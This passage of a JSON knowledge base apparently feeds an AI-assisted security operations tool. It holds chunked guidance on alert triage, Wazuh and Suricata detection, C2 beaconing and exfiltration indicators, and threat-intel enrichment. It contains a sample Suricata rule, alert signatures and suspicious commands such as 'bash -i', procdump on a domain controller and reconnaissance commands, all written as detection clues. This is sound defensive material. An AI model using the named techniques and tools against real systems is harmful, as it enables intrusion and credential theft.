+    "document": "soc_alert_triage.md",
+    "chunk_id": "security-soc_alert_triage-chunk-3",
+    "title": "SOC Alert Triage and Incident Response",
+    "text": "## Detection Clues\n- High severity alerts (e.g., Wazuh Level 12+) should be triaged immediately.\n- Multiple alerts firing for the same host across different tactics (e.g., Initial Access followed by Discovery) increase the confidence of a true positive compromise.",
+    "topic": "Lateral Movement",
+    "platform": "Wazuh HIDS",
+    "techniques": []
+  },
+  {
+    "source": "Security",
+    "category": "incident-response",
+    "document": "soc_alert_triage.md",
+    "chunk_id": "security-soc_alert_triage-chunk-4",
+    "title": "SOC Alert Triage and Incident Response",
+    "text": "## Investigation Guidance\nAlways verify the scope of the incident. If one host is compromised, look for lateral movement to other hosts. Document all findings and map them to the MITRE ATT&CK framework to ensure all stages of the attack lifecycle have been identified and remediated.",
+    "topic": "Lateral Movement",
+    "platform": "Wazuh HIDS",
+    "techniques": []
+  },
+  {
+    "source": "Security",
+    "category": "incident-response",
+    "document": "soc_detection_correlation.md",
+    "chunk_id": "security-soc_detection_correlation-chunk-0",
+    "title": "SOC Detection Correlation",
+    "text": "# SOC Detection Correlation",
+    "topic": "PowerShell Execution",
+    "platform": "Wazuh HIDS",
+    "techniques": [
+      "T1190",
+      "T1059.003",
+      "T1105"
+    ]
+  },
+  {
+    "source": "Security",
+    "category": "incident-response",
+    "document": "soc_detection_correlation.md",
+    "chunk_id": "security-soc_detection_correlation-chunk-1",
+    "title": "SOC Detection Correlation",
+    "text": "## Description\nDetection correlation is the analytical process of linking disparate security events from multiple data sources (endpoints, network, identity, threat intel) to form a cohesive narrative of a cyber attack.",
+    "topic": "PowerShell Execution",
+    "platform": "Wazuh HIDS",
+    "techniques": [
+      "T1190",
+      "T1059.003",
+      "T1105"
+    ]
+  },
+  {
+    "source": "Security",
+    "category": "incident-response",
+    "document": "soc_detection_correlation.md",
+    "chunk_id": "security-soc_detection_correlation-chunk-2",
+    "title": "SOC Detection Correlation",
+    "text": "## SOC Application\nNo single security control sees everything.\n1. **Network vs. Endpoint:** Suricata sees a malicious payload traversing the wire (Network). Wazuh sees that payload being saved to disk and executed (Endpoint). Correlating these proves the attack was successful.\n2. **Identity vs. Endpoint:** Azure AD flags a login from an impossible travel location (Identity). Wazuh sees that same user executing `procdump` on a Domain Controller (Endpoint).\n3. **Threat Intel Integration:** A generic Wazuh alert for a network connection becomes a critical incident when Threat Intel identifies the destination IP as a Cobalt Strike Team Server.",
+    "topic": "PowerShell Execution",
+    "platform": "Wazuh HIDS",
+    "techniques": [
+      "T1190",
+      "T1059.003",
+      "T1105"
+    ]
+  },
+  {
+    "source": "Security",
+    "category": "incident-response",
+    "document": "soc_detection_correlation.md",
+    "chunk_id": "security-soc_detection_correlation-chunk-3",
+    "title": "SOC Detection Correlation",
+    "text": "## Detection Clues\n- Look for temporal proximity: Did a Suricata exploit alert happen within seconds of a Wazuh anomalous process creation alert on the same host?\n- Track the entity: Follow the specific User Account or the specific Host IP across all available telemetry sources.",
+    "topic": "PowerShell Execution",
+    "platform": "Wazuh HIDS",
+    "techniques": [
+      "T1190",
+      "T1059.003",
+      "T1105"
+    ]
+  },
+  {
+    "source": "Security",
+    "category": "incident-response",
+    "document": "soc_detection_correlation.md",
+    "chunk_id": "security-soc_detection_correlation-chunk-4",
+    "title": "SOC Detection Correlation",
+    "text": "## Example Correlation Scenario\n1. **Suricata:** Detects inbound HTTP request containing an SQL Injection payload (T1190).\n2. **Wazuh:** Detects the `w3wp.exe` process spawning `cmd.exe` (T1059.003).\n3. **Threat Intel:** The source IP of the SQLi is a known malicious TOR exit node.\n4. **Wazuh:** Detects a PowerShell command downloading a secondary payload (T1105).\n5. **AI Conclusion:** High-confidence true positive. The web server has been compromised via SQLi, resulting in Remote Code Execution and subsequent tool ingress. Immediate containment required.",
+    "topic": "PowerShell Execution",
+    "platform": "Wazuh HIDS",
+    "techniques": [
+      "T1190",
+      "T1059.003",
+      "T1105"
+    ]
+  },
+  {
+    "source": "Suricata",
+    "category": "nids-detection",
+    "document": "suricata_c2_exfiltration.md",
+    "chunk_id": "suricata-suricata_c2_exfiltration-chunk-0",
+    "title": "Suricata Network Detection: C2 Beaconing & Data Exfiltration",
+    "text": "# Suricata Network Detection: C2 Beaconing & Data Exfiltration",
+    "topic": "Data Exfiltration",
+    "platform": "Suricata NIDS",
+    "techniques": []
+  },
+  {
+    "source": "Suricata",
+    "category": "nids-detection",
+    "document": "suricata_c2_exfiltration.md",
+    "chunk_id": "suricata-suricata_c2_exfiltration-chunk-1",
+    "title": "Suricata Network Detection: C2 Beaconing & Data Exfiltration",
+    "text": "## Command and Control (C2) Detection Concepts\n\nCommand and Control traffic represents communication between compromised internal endpoints and attacker-controlled external infrastructure.\n\n### Beaconing Detection",
+    "topic": "Data Exfiltration",
+    "platform": "Suricata NIDS",
+    "techniques": []
+  },
+  {
+    "source": "Suricata",
+    "category": "nids-detection",
+    "document": "suricata_c2_exfiltration.md",
+    "chunk_id": "suricata-suricata_c2_exfiltration-chunk-2",
+    "title": "Suricata Network Detection: C2 Beaconing & Data Exfiltration",
+    "text": "Adversary implants periodically communicate back to C2 servers to check for new commands.\n- **Regular Interval Beacons:** Connections occurring at precise periodic intervals (e.g., every 60 seconds with low jitter).\n- **Jittered Beacons:** Connections with randomized sleep delays to evade fixed-interval threshold rules.\n- **DNS Tunneling:** Exfiltration or C2 commands encoded within DNS queries to malicious authoritative nameservers (`TXT` or `A` record queries).",
+    "topic": "Data Exfiltration",
+    "platform": "Suricata NIDS",
+    "techniques": []
+  },
+  {
+    "source": "Suricata",
+    "category": "nids-detection",
+    "document": "suricata_c2_exfiltration.md",
+    "chunk_id": "suricata-suricata_c2_exfiltration-chunk-3",
+    "title": "Suricata Network Detection: C2 Beaconing & Data Exfiltration",
+    "text": "## Data Exfiltration Indicators\n\n1. **Large Outbound Volume:** Abnormally high bytes sent (`bytes_toserver`) over standard protocols (HTTP/HTTPS, SSH, FTP).\n2. **Non-Standard Ports:** Traffic using non-standard ports (e.g., HTTP over port 8080, 4444, or 8443).\n3. **Staging & Cloud Exfiltration:** Outbound transfers to legitimate cloud storage services (Mega, Google Drive, Dropbox) spawned by unauthorized processes.",
+    "topic": "Data Exfiltration",
+    "platform": "Suricata NIDS",
+    "techniques": []
+  },
+  {
+    "source": "Suricata",
+    "category": "nids-detection",
+    "document": "suricata_c2_exfiltration.md",
+    "chunk_id": "suricata-suricata_c2_exfiltration-chunk-4",
+    "title": "Suricata Network Detection: C2 Beaconing & Data Exfiltration",
+    "text": "## Investigation Guidance\n\n- Query DNS telemetry for high-volume unique subdomains under a single root domain (DNS tunneling).\n- Compare HTTP POST request body sizes against baseline user activity.\n- Verify whether the destination IP address belongs to known cloud infrastructure or malicious ISP networks.",
+    "topic": "Data Exfiltration",
+    "platform": "Suricata NIDS",
+    "techniques": []
+  },
+  {
+    "source": "Suricata",
+    "category": "nids-detection",
+    "document": "suricata_exploitation_detection.md",
+    "chunk_id": "suricata-suricata_exploitation_detection-chunk-0",
+    "title": "Suricata Exploitation Detection",
+    "text": "# Suricata Exploitation Detection",
+    "topic": "Lateral Movement",
+    "platform": "Suricata NIDS",
+    "techniques": [
+      "T1190"
+    ]
+  },
+  {
+    "source": "Suricata",
+    "category": "nids-detection",
+    "document": "suricata_exploitation_detection.md",
+    "chunk_id": "suricata-suricata_exploitation_detection-chunk-1",
+    "title": "Suricata Exploitation Detection",
+    "text": "## Description\nSuricata uses a signature-based engine (often utilizing the Emerging Threats ruleset) to identify network traffic matching known exploit patterns, vulnerabilities, and attack tools.",
+    "topic": "Lateral Movement",
+    "platform": "Suricata NIDS",
+    "techniques": [
+      "T1190"
+    ]
+  },
+  {
+    "source": "Suricata",
+    "category": "nids-detection",
+    "document": "suricata_exploitation_detection.md",
+    "chunk_id": "suricata-suricata_exploitation_detection-chunk-2",
+    "title": "Suricata Exploitation Detection",
+    "text": "## SOC Application\nSuricata is placed at the network perimeter or internal chokepoints to detect:\n1. **Initial Access (T1190):** Exploitation of public-facing applications (e.g., Log4j, ProxyLogon, Atlassian RCEs).\n2. **Web Application Attacks:** SQLi, XSS, Command Injection against web servers.\n3. **Lateral Movement Exploits:** Exploitation of internal vulnerabilities like EternalBlue (MS17-010) over SMB.\n4. **Network Scanning:** Aggressive port scans (Nmap) or vulnerability scanners (Nessus) probing the network.",
+    "topic": "Lateral Movement",
+    "platform": "Suricata NIDS",
+    "techniques": [
+      "T1190"
+    ]
+  },
+  {
+    "source": "Suricata",
+    "category": "nids-detection",
+    "document": "suricata_exploitation_detection.md",
+    "chunk_id": "suricata-suricata_exploitation_detection-chunk-3",
+    "title": "Suricata Exploitation Detection",
+    "text": "## Detection Clues\n- High severity alerts for CVE-specific signatures (e.g., `ET EXPLOIT Apache Log4j RCE Attempt`).\n- Volumetric alerts indicating network scanning or denial-of-service attempts.",
+    "topic": "Lateral Movement",
+    "platform": "Suricata NIDS",
+    "techniques": [
+      "T1190"
+    ]
+  },
+  {
+    "source": "Suricata",
+    "category": "nids-detection",
+    "document": "suricata_exploitation_detection.md",
+    "chunk_id": "suricata-suricata_exploitation_detection-chunk-4",
+    "title": "Suricata Exploitation Detection",
+    "text": "## Example Suricata Alert\n`ET EXPLOIT Possible ETERNALBLUE MS17-010 Echo Request (set)`",
+    "topic": "Lateral Movement",
+    "platform": "Suricata NIDS",
+    "techniques": [
+      "T1190"
+    ]
+  },
+  {
+    "source": "Suricata",
+    "category": "nids-detection",
+    "document": "suricata_exploitation_detection.md",
+    "chunk_id": "suricata-suricata_exploitation_detection-chunk-5",
+    "title": "Suricata Exploitation Detection",
+    "text": "## Correlation\nExploitation alerts from Suricata must be correlated with endpoint telemetry (Wazuh). A Suricata alert for Log4j is meaningless if the endpoint is not running Java. If Suricata detects an exploit attempt, check Wazuh for subsequent suspicious process creation (e.g., `bash -i` or `cmd.exe`) on the target host to determine if the exploit was successful.",
+    "topic": "Lateral Movement",
+    "platform": "Suricata NIDS",
+    "techniques": [
+      "T1190"
+    ]
+  },
+  {
+    "source": "Suricata",
+    "category": "nids-detection",
+    "document": "suricata_network_signatures.md",
+    "chunk_id": "suricata-suricata_network_signatures-chunk-0",
+    "title": "Suricata Network Signatures & Rule Documentation",
+    "text": "# Suricata Network Signatures & Rule Documentation",
+    "topic": "PowerShell Execution",
+    "platform": "Suricata NIDS",
+    "techniques": []
+  },
+  {
+    "source": "Suricata",
+    "category": "nids-detection",
+    "document": "suricata_network_signatures.md",
+    "chunk_id": "suricata-suricata_network_signatures-chunk-1",
+    "title": "Suricata Network Signatures & Rule Documentation",
+    "text": "## Overview\n\nSuricata is a high-performance Network Intrusion Detection System (NIDS), Intrusion Prevention System (NIPS), and Network Security Monitoring (NSM) engine. Suricata inspects packet payloads, HTTP headers, TLS handshakes, and DNS requests in real time.",
+    "topic": "PowerShell Execution",
+    "platform": "Suricata NIDS",
+    "techniques": []
+  },
+  {
+    "source": "Suricata",
+    "category": "nids-detection",
+    "document": "suricata_network_signatures.md",
+    "chunk_id": "suricata-suricata_network_signatures-chunk-2",
+    "title": "Suricata Network Signatures & Rule Documentation",
+    "text": "## Suricata Signature Structure\n\nA standard Suricata rule follows this syntax:\n`action header (options;)`\n\nExample:\n`alert http $HOME_NET any -> $EXTERNAL_NET any (msg:\"ET TROJAN Suspicious PowerShell User-Agent\"; flow:established,to_server; content:\"PowerShell\"; http_user_agent; sid:2014781; rev:3;)`\n\n### Key Rule Fields",
+    "topic": "PowerShell Execution",
+    "platform": "Suricata NIDS",
+    "techniques": []
+  },
+  {
+    "source": "Suricata",
+    "category": "nids-detection",
+    "document": "suricata_network_signatures.md",
+    "chunk_id": "suricata-suricata_network_signatures-chunk-3",
+    "title": "Suricata Network Signatures & Rule Documentation",
+    "text": "- **SID (Signature ID):** Unique numerical identifier for the detection rule.\n- **Protocol:** `http`, `tls`, `dns`, `tcp`, `udp`, `icmp`.\n- **Severity Classification:** `1` (High - Trojan/Exploit), `2` (Medium - Suspicious User-Agent/Traffic), `3` (Low - Informational).\n- **Flow Direction:** `$HOME_NET -> $EXTERNAL_NET` (outbound traffic) or `$EXTERNAL_NET -> $HOME_NET` (inbound attack).",
+    "topic": "PowerShell Execution",
+    "platform": "Suricata NIDS",
+    "techniques": []
+  },
+  {
+    "source": "Suricata",
+    "category": "nids-detection",
+    "document": "suricata_network_signatures.md",
+    "chunk_id": "suricata-suricata_network_signatures-chunk-4",
+    "title": "Suricata Network Signatures & Rule Documentation",
+    "text": "## Common Network Detections\n\n### SID 2014781: Suspicious PowerShell User-Agent\n- **Description:** Outbound HTTP request containing `PowerShell` in the User-Agent header string.\n- **Context:** PowerShell download cradles (`Invoke-WebRequest`) often use default User-Agent strings.\n\n### SID 2024311: TLS Connection to Suspicious Self-Signed Certificate\n- **Description:** Encrypted TLS session established with a destination IP using a self-signed or anomalous SSL/TLS certificate.\n- **Context:** Frequently indicates Command & Control (C2) beaconing (Meterpreter, Cobalt Strike).",
+    "topic": "PowerShell Execution",
+    "platform": "Suricata NIDS",
+    "techniques": []
+  },
+  {
+    "source": "Suricata",
+    "category": "nids-detection",
+    "document": "suricata_network_signatures.md",
+    "chunk_id": "suricata-suricata_network_signatures-chunk-5",
+    "title": "Suricata Network Signatures & Rule Documentation",
+    "text": "## Host-to-Network Correlation\n\nWhen analyzing a Suricata network alert:\n1. Extract `src_ip` (internal host) and `dst_ip` (external target / C2).\n2. Match `dst_ip` with recent host process logs (Sysmon Event ID 3 or Wazuh network alerts).\n3. Identify if the destination IP is hosting malicious payloads or C2 infrastructure.",
+    "topic": "PowerShell Execution",
+    "platform": "Suricata NIDS",
+    "techniques": []
+  },
+  {
+    "source": "Suricata",
+    "category": "nids-detection",
+    "document": "suricata_protocol_detection.md",
+    "chunk_id": "suricata-suricata_protocol_detection-chunk-0",
+    "title": "Suricata Protocol Detection",
+    "text": "# Suricata Protocol Detection",
+    "topic": "Brute Force",
+    "platform": "Suricata NIDS",
+    "techniques": []
+  },
+  {
+    "source": "Suricata",
+    "category": "nids-detection",
+    "document": "suricata_protocol_detection.md",
+    "chunk_id": "suricata-suricata_protocol_detection-chunk-1",
+    "title": "Suricata Protocol Detection",
+    "text": "## Description\nSuricata is a high-performance Network IDS, IPS, and Network Security Monitoring (NSM) engine. One of its core strengths is protocol parsing and detection. It does not just look for strings in raw packets; it decodes protocols like HTTP, DNS, TLS, SMB, SSH, and RDP to analyze their specific fields.",
+    "topic": "Brute Force",
+    "platform": "Suricata NIDS",
+    "techniques": []
+  },
+  {
+    "source": "Suricata",
+    "category": "nids-detection",
+    "document": "suricata_protocol_detection.md",
+    "chunk_id": "suricata-suricata_protocol_detection-chunk-2",
+    "title": "Suricata Protocol Detection",
+    "text": "## SOC Application\n1. **HTTP:** Suricata inspects URIs, User-Agents, and payloads. It detects SQL injection, XSS, directory traversal, and malicious file downloads.\n2. **DNS:** It monitors DNS requests and responses, detecting Fast Flux domains, DGA (Domain Generation Algorithm) activity, and DNS tunneling.\n3. **TLS:** Suricata inspects TLS certificates, SNI (Server Name Indication), and JA3 fingerprints to identify malicious encrypted C2 channels without needing to decrypt the payload.\n4. **SMB:** It parses SMB traffic to detect lateral movement tools (PsExec), named pipe anomalies, and ransomware iterating over file shares.\n5. **SSH/RDP:** It detects brute-force attempts and protocol anomalies on remote access ports.",
+    "topic": "Brute Force",
+    "platform": "Suricata NIDS",
+    "techniques": []
+  },
+  {
+    "source": "Suricata",
+    "category": "nids-detection",
+    "document": "suricata_protocol_detection.md",
+    "chunk_id": "suricata-suricata_protocol_detection-chunk-3",
+    "title": "Suricata Protocol Detection",
+    "text": "## Detection Clues\n- Look for mismatched protocols on non-standard ports (e.g., HTTP traffic on port 53).\n- Analyze JA3 hashes against threat intelligence feeds to identify known malware families communicating over TLS.",
+    "topic": "Brute Force",
+    "platform": "Suricata NIDS",
+    "techniques": []
+  },
+  {
+    "source": "Suricata",
+    "category": "nids-detection",
+    "document": "suricata_protocol_detection.md",
+    "chunk_id": "suricata-suricata_protocol_detection-chunk-4",
+    "title": "Suricata Protocol Detection",
+    "text": "## Example Suricata Alert\n`ET MALWARE Suspicious User-Agent (Mozilla/4.0 (compatible))` - indicates an outdated or hardcoded User-Agent string commonly used by basic malware.",
+    "topic": "Brute Force",
+    "platform": "Suricata NIDS",
+    "techniques": []
+  },
+  {
+    "source": "Suricata",
+    "category": "nids-detection",
+    "document": "suricata_protocol_detection.md",
+    "chunk_id": "suricata-suricata_protocol_detection-chunk-5",
+    "title": "Suricata Protocol Detection",
+    "text": "## Correlation\nSuricata network protocol alerts should be correlated with endpoint process network connections (Sysmon Event ID 3) to identify the specific binary initiating the anomalous traffic.",
+    "topic": "Brute Force",
+    "platform": "Suricata NIDS",
+    "techniques": []
+  },
+  {
+    "source": "Suricata",
+    "category": "nids-detection",
+    "document": "suricata_network.md",
+    "chunk_id": "suricata-suricata_network-chunk-0",
+    "title": "Suricata Network Detection \u2014 Network Indicators",
+    "text": "# Suricata Network Detection \u2014 Network Indicators",
+    "topic": "PowerShell Execution",
+    "platform": "Wazuh HIDS",
+    "techniques": []
+  },
+  {
+    "source": "Suricata",
+    "category": "nids-detection",
+    "document": "suricata_network.md",
+    "chunk_id": "suricata-suricata_network-chunk-1",
+    "title": "Suricata Network Detection \u2014 Network Indicators",
+    "text": "## Suricata Overview\n\nSuricata is a network-based intrusion detection and prevention system (NIDS/NIPS)\nthat inspects network traffic in real time. It complements host-based detections\n(like Wazuh) by providing visibility into network-layer activity.",
+    "topic": "PowerShell Execution",
+    "platform": "Wazuh HIDS",
+    "techniques": []
+  },
+  {
+    "source": "Suricata",
+    "category": "nids-detection",
+    "document": "suricata_network.md",
+    "chunk_id": "suricata-suricata_network-chunk-2",
+    "title": "Suricata Network Detection \u2014 Network Indicators",
+    "text": "## Network Indicators Relevant to PowerShell Attacks\n\nWhen PowerShell-based attacks communicate with external infrastructure, Suricata may detect:\n\n- **Outbound HTTP/HTTPS to suspicious IPs:** Connections to known C2 infrastructure\n- **DNS queries to suspicious domains:** Domain generation algorithm (DGA) patterns\n- **Unusual TLS certificates:** Self-signed or recently registered certificates\n- **Large outbound data transfers:** Potential data exfiltration\n- **Beaconing patterns:** Regular interval connections to the same destination",
+    "topic": "PowerShell Execution",
+    "platform": "Wazuh HIDS",
+    "techniques": []
+  },
+  {
+    "source": "Suricata",
+    "category": "nids-detection",
+    "document": "suricata_network.md",
+    "chunk_id": "suricata-suricata_network-chunk-3",
+    "title": "Suricata Network Detection \u2014 Network Indicators",
+    "text": "## Correlating Host and Network Evidence\n\nFor comprehensive analysis:\n\n1. Match the `dst_ip` from a host alert with Suricata network flow records\n2. Check if the destination IP appears in threat intelligence feeds\n3. Look for DNS resolution events preceding the connection\n4. Identify the volume and direction of data transfer\n5. Determine if the connection uses standard or non-standard ports",
+    "topic": "PowerShell Execution",
+    "platform": "Wazuh HIDS",
+    "techniques": []
+  },
+  {
+    "source": "Suricata",
+    "category": "nids-detection",
+    "document": "suricata_network.md",
+    "chunk_id": "suricata-suricata_network-chunk-4",
+    "title": "Suricata Network Detection \u2014 Network Indicators",
+    "text": "## External IP Analysis\n\nWhen an alert includes an external destination IP:\n\n- **Private ranges (10.x, 172.16-31.x, 192.168.x):** Internal lateral movement\n- **Public IPs:** Potential C2, data exfiltration, or legitimate external service\n- **Known hosting providers:** May indicate cloud-hosted C2 infrastructure\n- GitHub/CDN IPs (e.g., 185.199.108.x): Could be legitimate OR used for payload hosting",
+    "topic": "PowerShell Execution",
+    "platform": "Wazuh HIDS",
+    "techniques": []
+  },
+  {
+    "source": "Suricata",
+    "category": "nids-detection",
+    "document": "suricata_network.md",
+    "chunk_id": "suricata-suricata_network-chunk-5",
+    "title": "Suricata Network Detection \u2014 Network Indicators",
+    "text": "## Risk Indicators from Network Context\n\n- Connection to external IP shortly after process execution: **High risk**\n- Connection on non-standard ports: **Medium-High risk**\n- Encrypted traffic to unknown destinations: **Medium risk**\n- Connection to well-known services with expected traffic: **Low risk**",
+    "topic": "PowerShell Execution",
+    "platform": "Wazuh HIDS",
+    "techniques": []
+  },
+  {
+    "source": "Suricata",
+    "category": "nids-detection",
+    "document": "suricata_network.md",
+    "chunk_id": "suricata-suricata_network-chunk-6",
+    "title": "Suricata Network Detection \u2014 Network Indicators",
+    "text": "## Investigation Steps\n\n1. Resolve the destination IP to identify the hosting provider or organization\n2. Check if the IP is listed in threat intelligence databases\n3. Review full network session data if available from Suricata\n4. Correlate timing between host-level process execution and network connection\n5. Assess whether the traffic volume is consistent with expected behavior",
+    "topic": "PowerShell Execution",
+    "platform": "Wazuh HIDS",
+    "techniques": []
+  },
+  {
+    "source": "Threat Intel",
+    "category": "threat-intelligence",
+    "document": "ioc_and_threat_intel.md",
+    "chunk_id": "threat_intel-ioc_and_threat_intel-chunk-0",
+    "title": "Threat Intelligence & Indicator of Compromise (IOC) Fundamentals",
+    "text": "# Threat Intelligence & Indicator of Compromise (IOC) Fundamentals",
+    "topic": "Phishing",
+    "platform": "General",
+    "techniques": []
+  },
+  {
+    "source": "Threat Intel",
+    "category": "threat-intelligence",
+    "document": "ioc_and_threat_intel.md",
+    "chunk_id": "threat_intel-ioc_and_threat_intel-chunk-1",
+    "title": "Threat Intelligence & Indicator of Compromise (IOC) Fundamentals",
+    "text": "## Overview\n\nThreat Intelligence enrichment enhances raw security alert evidence by matching extracted Indicators of Compromise (IOCs) against reputation databases and threat feeds.",
+    "topic": "Phishing",
+    "platform": "General",
+    "techniques": []
+  },
+  {
+    "source": "Threat Intel",
+    "category": "threat-intelligence",
+    "document": "ioc_and_threat_intel.md",
+    "chunk_id": "threat_intel-ioc_and_threat_intel-chunk-2",
+    "title": "Threat Intelligence & Indicator of Compromise (IOC) Fundamentals",
+    "text": "## Types of Indicators of Compromise (IOCs)\n\n1. **IP Addresses:** External IPv4/IPv6 addresses originating inbound attacks or serving as C2 endpoints.\n2. **Domain Names & URLs:** FQDNs used for phishing landing pages, payload hosting, or C2 beaconing.\n3. **File Hashes:** Cryptographic hashes (MD5, SHA-1, SHA-256) uniquely identifying malicious executables, scripts, or DLLs.\n4. **Registry Keys & File Paths:** Artifacts left by malware persistence mechanisms on endpoints.",
+    "topic": "Phishing",
+    "platform": "General",
+    "techniques": []
+  },
+  {
+    "source": "Threat Intel",
+    "category": "threat-intelligence",
+    "document": "ioc_and_threat_intel.md",
+    "chunk_id": "threat_intel-ioc_and_threat_intel-chunk-3",
+    "title": "Threat Intelligence & Indicator of Compromise (IOC) Fundamentals",
+    "text": "## IOC Enrichment Workflow (VirusTotal Integration Concepts)\n\n*Note: Future VirusTotal integration will automatically query extracted alert IOCs.*",
+    "topic": "Phishing",
+    "platform": "General",
+    "techniques": []
+  },
+  {
+    "source": "Threat Intel",
+    "category": "threat-intelligence",
+    "document": "ioc_and_threat_intel.md",
+    "chunk_id": "threat_intel-ioc_and_threat_intel-chunk-4",
+    "title": "Threat Intelligence & Indicator of Compromise (IOC) Fundamentals",
+    "text": "### Enrichment Process\n1. **Extraction:** Parse alert fields (`src_ip`, `dst_ip`, command line file hashes, domains).\n2. **Reputation Lookup:** Query threat intelligence APIs (e.g. VirusTotal API v3) for vendor detections, community scores, and historical threat actor tags.\n3. **Scoring & Classification:**\n   - **Malicious:** Multi-vendor detection (> 5 engines), flagged as malware/C2.\n   - **Suspicious:** Newly registered domain (< 14 days), low vendor detection count, self-signed SSL.\n   - **Benign / Known Good:** Trusted CDN (Microsoft, Akamai, Cloudflare), known public infrastructure.",
+    "topic": "Phishing",
+    "platform": "General",
+    "techniques": []
+  },
+  {
+    "source": "Threat Intel",
+    "category": "threat-intelligence",
+    "document": "ioc_and_threat_intel.md",
+    "chunk_id": "threat_intel-ioc_and_threat_intel-chunk-5",
+    "title": "Threat Intelligence & Indicator of Compromise (IOC) Fundamentals",
+    "text": "## Threat Intel Analysis Best Practices\n\n- Do NOT classify public cloud or CDN IP addresses (e.g., GitHub, AWS S3) as inherently malicious without evaluating the specific hosted path or domain context.\n- Always combine threat intelligence reputation scores with internal host execution evidence before declaring an incident critical.",
+    "topic": "Phishing",
+    "platform": "General",
+    "techniques": []
+  },
+  {
+    "source": "Threat Intel",
+    "category": "threat-intelligence",
+    "document": "threat_intel_actor_behavior.md",
+    "chunk_id": "threat_intel-threat_intel_actor_behavior-chunk-0",
+    "title": "Threat Actor Behavior & Confidence",
+    "text": "# Threat Actor Behavior & Confidence",
+    "topic": "PowerShell Execution",
+    "platform": "MITRE ATT&CK",
+    "techniques": []
+  },
+  {
+    "source": "Threat Intel",
+    "category": "threat-intelligence",
+    "document": "threat_intel_actor_behavior.md",
+    "chunk_id": "threat_intel-threat_intel_actor_behavior-chunk-1",
+    "title": "Threat Actor Behavior & Confidence",
+    "text": "## Description\nUnderstanding Threat Actor behavior goes beyond static IOCs (which change rapidly) and focuses on the underlying Tactics, Techniques, and Procedures (TTPs) mapped in frameworks like MITRE ATT&CK.",
+    "topic": "PowerShell Execution",
+    "platform": "MITRE ATT&CK",
+    "techniques": []
+  },
+  {
+    "source": "Threat Intel",
+    "category": "threat-intelligence",
+    "document": "threat_intel_actor_behavior.md",
+    "chunk_id": "threat_intel-threat_intel_actor_behavior-chunk-2",
+    "title": "Threat Actor Behavior & Confidence",
+    "text": "## SOC Application\n1. **Behavioral Profiling:** Recognizing that a sequence of `whoami`, `systeminfo`, and `nltest` is typical reconnaissance behavior, regardless of the malware family.\n2. **Attribution:** Associating specific behaviors or custom tools with known groups (e.g., APT29, FIN7).\n3. **False Positive Considerations:** Understanding that system administrators also use tools like PsExec and PowerShell. Context (who, what, when, where) is critical for confidence scoring.",
+    "topic": "PowerShell Execution",
+    "platform": "MITRE ATT&CK",
+    "techniques": []
+  },
+  {
+    "source": "Threat Intel",
+    "category": "threat-intelligence",
+    "document": "threat_intel_actor_behavior.md",
+    "chunk_id": "threat_intel-threat_intel_actor_behavior-chunk-3",
+    "title": "Threat Actor Behavior & Confidence",
+    "text": "## Detection Clues\n- Focus on the *chain of events*. A single administrative command might be benign, but five executed in rapid succession by a service account is highly malicious.\n- Look for Living off the Land (LotL) techniques where attackers use native OS tools (LOLBins) to avoid dropping custom malware.",
+    "topic": "PowerShell Execution",
+    "platform": "MITRE ATT&CK",
+    "techniques": []
+  },
+  {
+    "source": "Threat Intel",
+    "category": "threat-intelligence",
+    "document": "threat_intel_actor_behavior.md",
+    "chunk_id": "threat_intel-threat_intel_actor_behavior-chunk-4",
+    "title": "Threat Actor Behavior & Confidence",
+    "text": "## Investigation Guidance\nWhen investigating, ask: \"Does this behavior make sense for this user role and this host?\" Build hypotheses based on attacker methodologies. If you see credential dumping, assume lateral movement will follow, and proactively hunt for it.",
+    "topic": "PowerShell Execution",
+    "platform": "MITRE ATT&CK",
+    "techniques": []
+  },
+  {
+    "source": "Threat Intel",
+    "category": "threat-intelligence",
+    "document": "threat_intel_ioc_enrichment.md",
+    "chunk_id": "threat_intel-threat_intel_ioc_enrichment-chunk-0",
+    "title": "Threat Intelligence & IOC Enrichment",
+    "text": "# Threat Intelligence & IOC Enrichment",
+    "topic": "Ransomware",
+    "platform": "General",
+    "techniques": []
+  },
+  {
+    "source": "Threat Intel",
+    "category": "threat-intelligence",
+    "document": "threat_intel_ioc_enrichment.md",
+    "chunk_id": "threat_intel-threat_intel_ioc_enrichment-chunk-1",
+    "title": "Threat Intelligence & IOC Enrichment",
+    "text": "## Description\nThreat Intelligence involves gathering information about threat actors, their tactics, techniques, and procedures (TTPs), and the specific Indicators of Compromise (IOCs) they use. Enrichment is the process of adding this context to raw SOC alerts.",
+    "topic": "Ransomware",
+    "platform": "General",
+    "techniques": []
+  },
+  {
+    "source": "Threat Intel",
+    "category": "threat-intelligence",
+    "document": "threat_intel_ioc_enrichment.md",
+    "chunk_id": "threat_intel-threat_intel_ioc_enrichment-chunk-2",
+    "title": "Threat Intelligence & IOC Enrichment",
+    "text": "## SOC Application\n1. **IP/Domain Reputation:** Checking external IPs against databases (like VirusTotal, AbuseIPDB, or AlienVault OTX) to see if they are known C2 servers, Tor exit nodes, or malicious scanners.\n2. **File Hashes:** Comparing SHA256 hashes of downloaded files or executed processes against malware databases.\n3. **Contextualizing Alerts:** Transforming a generic \"Suspicious Connection\" alert into \"Connection to known Trickbot C2 server.\"",
+    "topic": "Ransomware",
+    "platform": "General",
+    "techniques": []
+  },
+  {
+    "source": "Threat Intel",
+    "category": "threat-intelligence",
+    "document": "threat_intel_ioc_enrichment.md",
+    "chunk_id": "threat_intel-threat_intel_ioc_enrichment-chunk-3",
+    "title": "Threat Intelligence & IOC Enrichment",
+    "text": "## Detection Clues\n- An alert is significantly more severe if the destination IP is present on a known APT threat feed.\n- Newly registered domains (NRDs) or domains with poor reputation scores should be treated with high suspicion.",
+    "topic": "Ransomware",
+    "platform": "General",
+    "techniques": []
+  },
+  {
+    "source": "Threat Intel",
+    "category": "threat-intelligence",
+    "document": "threat_intel_ioc_enrichment.md",
+    "chunk_id": "threat_intel-threat_intel_ioc_enrichment-chunk-4",
+    "title": "Threat Intelligence & IOC Enrichment",
+    "text": "## Investigation Guidance\nWhen an alert triggers, extract the observable (IP, Hash, Domain). Query threat intel platforms to determine its reputation. If malicious, use the intel to understand the malware family's typical behavior (e.g., \"This malware usually drops ransomware next\").",
+    "topic": "Ransomware",
+    "platform": "General",
+    "techniques": []
+  },
+  {
+    "source": "Threat Intel",
+    "category": "threat-intelligence",
+    "document": "threat_intel_ioc_enrichment.md",
+    "chunk_id": "threat_intel-threat_intel_ioc_enrichment-chunk-5",
+    "title": "Threat Intelligence & IOC Enrichment",
